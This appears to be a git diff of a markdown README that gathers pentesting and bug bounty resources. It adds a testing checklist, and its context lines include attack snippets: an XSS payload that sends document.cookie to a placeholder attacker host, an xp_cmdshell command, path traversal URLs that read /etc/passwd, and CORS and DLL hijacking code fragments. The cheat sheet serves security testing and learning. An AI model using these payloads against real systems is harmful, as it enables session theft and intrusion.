@@ -8,6 +8,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 
 - [Blog / Writeups / News & more](#blog--writeups--news--more)
 - [Safety tips](#safety-tips)
+- [Check-lists](#check-lists)
 - [Tools](#tools)
   - [Burp Suite](#burp-suite)
 - [Content Discovery](#content-discovery)
@@ -29,6 +30,8 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [Network](#network)
 - [Linux](#linux)
 
+<hr/>
+
 ### Blog / Writeups / News & more
 
 - https://portswigger.net/research
@@ -45,6 +48,8 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - https://github.com/juliocesarfort/public-pentesting-reports
 - https://pentestreports.com/
 
+<hr/>
+
 ### Safety tips
 
 - For RCE 
@@ -60,6 +65,63 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
     ```HTML
     <!-- PoC by seeu -->
     ```
+
+<hr/>
+
+### Check-lists
+
+#### Testing layers
+
+- [ ] Integrations
+- [ ] Application Libraries (usually JavaScript)
+- [ ] Application: Custom Code or COTS
+- [ ] Application Framework
+- [ ] Web Hosting Software (Default creds, Web server misconfigurations, web exploits)
+- [ ] Open Ports and Services (Default creds on services, service level exploits)
+
+#### Bug bounty
+
+Multiple targets
+- [ ] Run EasyG assetenum + take screenshots
+- [ ] Select the interesting targets
+
+Single target
+- [ ] Test register
+- [ ] Test login: 2FA, Password reset, Open Redirect
+- [ ] [Upload Functions](#upload-functions-check-list)
+- [ ] Broken Access Control, IDOR & co
+  - [IDOR Checklist](https://twitter.com/hunter0x7/status/1580211248037126145) 
+- [ ] [OWASP Web Application Penetration Checklist v1.1](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Web_Application_Penetration_Checklist_v1_1.pdf)
+- [ ] Content Types
+  - Look for multipart-forms
+  - Look for content type XML
+  - Look for content type json
+- [ ] APIs
+  - Methods
+- [ ]  Account Section
+  - Profile
+    - Stored XSS 
+  - App Custom Fields 
+  - Integrations
+    - SSRF, XSS
+- [ ]  Errors
+
+#### Upload Functions check-list
+
+- [ ] Integrations (from 3rd party)
+  - XSS
+- [ ] Self Uploads
+  - XML based (Docs/PDF)
+    - SSRF, XSS
+  - Image
+    - XSS, Shell
+      - Name
+      - Binary header
+      - Metadata
+- [ ] Where is data stored?
+  - s3 perms
+
+<hr/>
 
 ### Tools
 
@@ -203,6 +265,8 @@ Cool extensions:
 - [Wordlist Extractor](https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7)
 - [IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
 
+<hr/>
+
 ### Content Discovery
 
 **Some tips**
@@ -241,6 +305,8 @@ Cool extensions:
 - `intitle:` to search interesting pages like admin, register, login etc.
 - [Dorking on Steroids](https://hazanasec.github.io/2021-03-11-Dorking-on-Steriods/)
 
+<hr/>
+
 ### Bash
 
 Read a file line by line with a script like `./bash.sh filename`
@@ -250,6 +316,8 @@ while read -r line; do
     echo -e "$line"
 done <$file 
 ```
+
+<hr/>
 
 ### XSS
 
@@ -320,6 +388,8 @@ If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a
     <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.cookie;>
     ```
 
+<hr/>
+
 ### SQLi
 
 - [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
@@ -352,6 +422,8 @@ GO
 xp_cmdshell 'COMMAND';
 ```
 
+<hr/>
+
 ### SSRF
 
 SSRF with blacklist-based input filters bypass: Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
@@ -379,6 +451,8 @@ Other tips
 Burp extensions
 - [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968)
 
+<hr/>
+
 ### Authentication vulnerabilities
 
 - Multi-factor authentication
@@ -390,6 +464,7 @@ Burp extensions
 - [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
 - [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
 
+<hr/>
 
 ### Access control vulnerabilities and privilege escalation
 
@@ -412,6 +487,8 @@ From a user perspective, access controls can be divided into the following categ
 - [UUID Detector](https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248)
 - Check also endpoints in JS files, see [tools](#tools)
 
+<hr/>
+
 ### Directory Traversal
 
 - simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
@@ -420,6 +497,8 @@ From a user perspective, access controls can be divided into the following categ
 - superfluous URL-decode `https://insecure-website.com/loadImage?filename=..%252f..%252f..%252fetc/passwd`
 - validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
 - validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`
+
+<hr/>
 
 ### Business logic vulnerabilities
 
@@ -433,6 +512,8 @@ Examples:
 - Insufficient workflow validation
 - Flawed enforcement of business rules
 - [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
+
+<hr/>
 
 ### CORS
 
@@ -472,6 +553,8 @@ CORS vulnerability with trusted insecure protocols
 </script>
 ```
 
+<hr/>
+
 ### Deserialization
 
 **Ysoserial**
@@ -490,6 +573,8 @@ Burp extensions:
 - [GadgetProbe](https://portswigger.net/bappstore/e20cad259d73403bba5ac4e393a8583f)
 - [Freddy, Deserialization Bug Finder](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3)
 - [PHP Object Injection Check](https://portswigger.net/bappstore/24dab228311049d89a27a4d721e17ef7)
+
+<hr/>
 
 ### DLL Hijacking
 
@@ -521,6 +606,8 @@ BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 - [hijacklibs.net](https://hijacklibs.net/)
 - [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)
 
+<hr/>
+
 ### GraphQL
 
 To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.
@@ -538,6 +625,8 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 ```
 {"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
 ```
+
+<hr/>
 
 ### WordPress
 
@@ -561,6 +650,8 @@ More here: https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologi
 
 https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/
 
+<hr/>
+
 ### IIS - Internet Information Services
 
 - Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)
@@ -579,11 +670,15 @@ https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-I
 
 Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
 
+<hr/>
+
 ### Lotus Domino
 
 - Find Lotus Domino with nuclei: `%USERPROFILE%\nuclei-templates\technologies\lotus-domino-version.yaml`
 - Exploit DB: [Lotus-Domino](https://www.exploit-db.com/search?q=Lotus+Domino)
 - Fuzzing list: [SecLists/LotusNotes.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/LotusNotes.fuzz.txt)
+
+<hr/>
 
 ### Network
 ```
@@ -591,6 +686,8 @@ ip route add <net_address_in_cdr> via <interface_gateway>
 route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway> (Windows)
 nmap -sn <net_address_in_cdr> | Check hosts alive, adding -A you gather more info for a target
 ```
+
+<hr/>
 
 ### Linux
 
